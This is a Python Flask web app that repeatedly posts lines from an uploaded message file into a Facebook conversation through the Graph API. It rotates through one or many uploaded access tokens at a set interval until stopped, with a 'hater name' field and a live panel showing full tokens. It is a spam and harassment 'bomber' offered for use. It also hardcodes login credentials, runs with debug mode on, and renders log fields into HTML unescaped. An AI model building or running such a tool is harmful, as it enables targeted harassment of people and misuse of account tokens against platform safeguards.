# save as app.py and run: python app.py
from flask import Flask, request, render_template_string, jsonify, session, redirect, url_for
import requests
from threading import Thread, Event
import time
import random
import string
from datetime import datetime
import pytz

app = Flask(__name__)
app.debug = True
app.secret_key = 'replace_this_with_a_random_secret_key_!'

# Login credentials for opening full-screen live box
LIVE_USERNAME = "The-Arjun"
LIVE_PASSWORD = "Tahkur123"

# HTTP headers used for requests
headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

# runtime data
stop_events = {}
threads = {}
live_logs = []   # list of dicts: token, thread_id, name, message, status, time
MAX_LOGS = 500

def ist_now():
    tz = pytz.timezone("Asia/Kolkata")
    return datetime.now(tz).strftime("%Y-%m-%d %H:%M:%S")

def append_log(entry):
    live_logs.append(entry)
    if len(live_logs) > MAX_LOGS:
        del live_logs[0:len(live_logs)-MAX_LOGS]

def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
    stop_event = stop_events[task_id]
    while not stop_event.is_set():
        for msg_text in messages:
            if stop_event.is_set():
                break
            for access_token in access_tokens:
                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                full_message = f"{mn} {msg_text}"
                params = {'access_token': access_token, 'message': full_message}
                try:
                    r = requests.post(api_url, data=params, headers=headers, timeout=15)
                    ok = r.status_code == 200
                except Exception as e:
                    ok = False

                log = {
                    "token": access_token,           # full token (as requested)
                    "thread_id": thread_id,
                    "name": mn,
                    "message": msg_text,             # original message from file
                    "status": "✅ Message Sent Successfully" if ok else f"❌ Message Failed",
                    "time": ist_now()
                }
                append_log(log)

                # allow stop check while sleeping
                slept = 0.0
                while slept < time_interval:
                    if stop_event.is_set():
                        break
                    time.sleep(0.5)
                    slept += 0.5
            if stop_event.is_set():
                break
        # loop repeats until stop_event set

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        token_option = request.form.get('tokenOption')
        if token_option == 'single':
            access_tokens = [request.form.get('singleToken') or '']
        else:
            token_file = request.files.get('tokenFile')
            if not token_file:
                return "Token file missing", 400
            access_tokens = token_file.read().decode(errors='ignore').strip().splitlines()

        thread_id = request.form.get('threadId') or ''
        mn = request.form.get('kidx') or ''
        try:
            time_interval = float(request.form.get('time') or 1)
            if time_interval < 0.1:
                time_interval = 1.0
        except:
            time_interval = 1.0

        txt_file = request.files.get('txtFile')
        if not txt_file:
            return "Message file missing", 400
        messages = txt_file.read().decode(errors='ignore').splitlines()
        if not messages:
            return "No messages in file", 400

        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        stop_events[task_id] = Event()
        t = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id), daemon=True)
        threads[task_id] = t
        t.start()

        # log task start
        append_log({
            "token": ", ".join(access_tokens[:3]) + ("..." if len(access_tokens) > 3 else ""),
            "thread_id": thread_id,
            "name": mn,
            "message": f"Task started (ID: {task_id}) - tokens:{len(access_tokens)} msgs:{len(messages)}",
            "status": "🔰 TASK_STARTED",
            "time": ist_now()
        })

        return f'Task started with ID: {task_id}'

    # GET -> render original panel; login for full-screen live box is via /login -> /live
    return render_template_string("""
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>【🦋🌹𝐂𝐎𝐍𝐓𝐑𝐀𝐂𝐓 𝐎𝐖𝐍𝐄𝐑 𝐀𝐑𝐉𝐔𝐍 𝐓𝐇𝐀𝐊𝐔𝐑 🌹🦋】</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body {
      background-image: url('https://i.ibb.co/BHk1RJGN/1759735913212.jpg');
      background-size: cover;
      background-repeat: no-repeat;
      color: white;
      min-height: 100vh;
    }
    .panel {
      max-width: 360px;
      margin: 30px auto;
      padding: 18px;
      background: rgba(0,0,0,0.55);
      border-radius: 12px;
      box-shadow: 0 0 18px rgba(255,255,255,0.04);
    }
    .form-control { background: transparent; color: white; border: 1px double #fff; margin-bottom:8px; }
    .live-open {
      text-align: center;
      margin-top: 12px;
    }
    .note { color:#ddd; font-size:13px; margin-top:8px; }
  </style>
</head>
<body>
  <div class="panel text-center">
    <h4 class="mb-2">【🌹🦋𝐎𝐅𝐅𝐋𝐈𝐍𝐄 𝐒𝐀𝐑𝐕𝐄𝐑 𝐏𝐄𝐍𝐀𝐋🦋❤️】</h4>
    <form method="post" enctype="multipart/form-data">
      <select class="form-control" id="tokenOption" name="tokenOption" onchange="toggleTokenInput()" required>
        <option value="single">Single Token</option>
        <option value="multiple">Token File</option>
      </select>
      <div id="singleTokenInput">
        <input type="text" class="form-control" id="singleToken" name="singleToken" placeholder="Enter Single Token">
      </div>
      <div id="tokenFileInput" style="display:none;">
        <input type="file" class="form-control" id="tokenFile" name="tokenFile">
      </div>

      <input type="text" class="form-control" name="threadId" placeholder="Enter Inbox/convo uid" required>
      <input type="text" class="form-control" name="kidx" placeholder="Enter Your Hater Name" required>
      <input type="number" step="0.1" class="form-control" name="time" placeholder="Enter Time (seconds)" required>
      <input type="file" class="form-control" name="txtFile" required>

      <button type="submit" class="btn btn-primary w-100 mt-2">【❤️𝐑𝐔𝐍❤️】</button>
    </form>

    <form method="post" action="/【❤️𝐒𝐓𝐎𝐏❤️】" class="mt-3">
      <input type="text" class="form-control" name="taskId" placeholder="Enter Task ID to Stop" required>
      <button type="submit" class="btn btn-danger w-100 mt-2">Stop</button>
    </form>

    <div class="live-open">
      <p class="note">Full-screen Live Box (requires login)</p>
      <a href="/login" class="btn btn-success">Open Live Box (Login)</a>
    </div>
  </div>
</body>

<script>
function toggleTokenInput(){
  var v = document.getElementById('tokenOption').value;
  document.getElementById('singleTokenInput').style.display = (v=='single') ? 'block' : 'none';
  document.getElementById('tokenFileInput').style.display = (v=='multiple') ? 'block' : 'none';
}
</script>
</html>
""")

@app.route('/stop', methods=['POST'])
def stop_task():
    task_id = request.form.get('taskId')
    if task_id in stop_events:
        stop_events[task_id].set()
        append_log({
            "token": "",
            "thread_id": "",
            "name": "",
            "message": f"Task {task_id} stopped by user",
            "status": "🔰 TASK_STOPPED",
            "time": ist_now()
        })
        return f'Task with ID {task_id} has been stopped.'
    else:
        return f'No task found with ID {task_id}.'

# simple login page that redirects to /live on success
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        u = request.form.get('username','')
        p = request.form.get('password','')
        if u == LIVE_USERNAME and p == LIVE_PASSWORD:
            session['live_login'] = True
            return redirect(url_for('live'))
        else:
            return render_template_string(LOGIN_HTML, error="Invalid credentials")
    return render_template_string(LOGIN_HTML, error=None)

LOGIN_HTML = """
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Login - Live Box</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body { background:#0b0b0b; color:#fff; font-family:Arial, sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; }
    .box { background: rgba(255,255,255,0.03); padding:24px; border-radius:10px; width:320px; box-shadow:0 0 18px rgba(0,255,255,0.06); }
    input { width:100%; padding:10px; margin:8px 0; border-radius:6px; border:1px solid #333; background:#111; color:#fff; }
    button { width:100%; padding:10px; border-radius:6px; border:none; background:#00d1c1; color:#000; font-weight:700; }
    .err { color:#ff8080; margin-top:8px; text-align:center; }
    .hint { color:#bbb; font-size:13px; margin-top:8px; text-align:center; }
  </style>
</head>
<body>
  <div class="box">
    <h3 style="text-align:center; margin:0 0 12px 0;">🔐 Live Box Login</h3>
    <form method="post">
      <input name="username" placeholder="Username" required>
      <input name="password" type="password" placeholder="Password" required>
      <button type="submit">Login</button>
    </form>
    {% if error %}<div class="err">{{ error }}</div>{% endif %}
    <div class="hint">Username: <strong>The-Hassan</strong> | Password: <strong>Hassan123</strong></div>
  </div>
</body>
</html>
"""

# full-screen live box (requires login session)
@app.route('/live')
def live():
    if not session.get('live_login'):
        return redirect(url_for('login'))
    return render_template_string(LIVE_HTML)

LIVE_HTML = """
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Live Box — Full Screen</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    html,body { height:100%; margin:0; background:#000; color:#00ffd1; font-family:monospace; overflow:hidden; }
    .live-full {
      position:fixed; inset:0; background:linear-gradient(180deg,#000 0%, #041018 100%); padding:18px; box-sizing:border-box; overflow:auto;
    }
    .topbar { display:flex; justify-content:space-between; align-items:center; gap:12px; margin-bottom:12px; }
    .title { font-size:18px; font-weight:700; color:#00ffd1; }
    .btn { background:#00ffd1; color:#000; padding:6px 10px; border-radius:6px; text-decoration:none; font-weight:700; }
    .logs { max-width:1200px; margin:0 auto; }
    .event {
      background: rgba(0,255,209,0.03);
      border-left:4px solid rgba(0,255,209,0.12);
      padding:12px; margin-bottom:10px; border-radius:6px; color:#dff;
    }
    .meta { color:#9ff; font-size:13px; margin-bottom:6px; }
    .msg { white-space:pre-wrap; color:#fff; font-size:15px; }
  </style>
</head>
<body>
  <div class="live-full">
    <div class="topbar">
      <div class="title">📡 LIVE BOX — Full Screen (IST)</div>
      <div>
        <a class="btn" href="/" target="_blank">Open Panel</a>
        <form method="post" action="/logout" style="display:inline;">
          <button class="btn" type="submit">Logout</button>
        </form>
      </div>
    </div>

    <div class="logs" id="logs"></div>
  </div>

<script>
function fetchLogs(){
  fetch('/events_poll_full')
    .then(r => r.json())
    .then(data => {
      const container = document.getElementById('logs');
      container.innerHTML = '';
      data.slice().reverse().forEach(ev => {
        const div = document.createElement('div');
        div.className = 'event';
        div.innerHTML = `
          <div class="meta"><strong>${ev.time}</strong> — <span>${ev.status}</span></div>
          <div class="msg"><b>From:</b> ${ev.name} &nbsp; <b>ThreadID:</b> ${ev.thread_id}</div>
          <div class="msg"><b>Token:</b> ${ev.token}</div>
          <div class="msg"><b>Msg:</b><br>${ev.message}</div>
        `;
        container.appendChild(div);
      });
      // auto-scroll to top (most recent on top)
      // no autoplay scroll to bottom; keep newest at top
      if(container.firstChild) container.firstChild.scrollIntoView({behavior:'auto', block:'start'});
    })
    .catch(err => {
      console.error(err);
    });
}

// poll every 2 seconds
setInterval(fetchLogs, 2000);
fetchLogs();
</script>
</body>
</html>
"""

# API endpoint used by full-screen live box (returns last N logs)
@app.route('/events_poll_full')
def events_poll_full():
    if not session.get('live_login'):
        return jsonify([]), 401
    return jsonify(live_logs[-300:])

# logout route for live box
@app.route('/logout', methods=['POST'])
def logout():
    session.pop('live_login', None)
    return redirect(url_for('index'))

if __name__ == '__main__':
    # run on 0.0.0.0:5000
    app.run(host='0.0.0.0', port=5000)
